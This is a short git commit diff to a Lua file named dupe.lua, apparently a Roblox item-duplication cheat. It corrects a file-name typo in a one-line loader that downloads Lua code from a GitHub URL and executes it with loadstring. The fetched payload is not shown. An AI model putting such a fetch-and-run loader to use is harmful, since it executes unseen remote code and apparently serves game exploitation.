8b652b81e86d9940814174fb4d8fb6003079cd7c
SunnieHub <111681065+SunnieHub@users.noreply.github.com>
2023-03-26 18:29:49 +0700

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SunnieHub/INAAHEEEE/main/potected.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SunnieHub/INAAHEEEE/main/protected.lua"))()
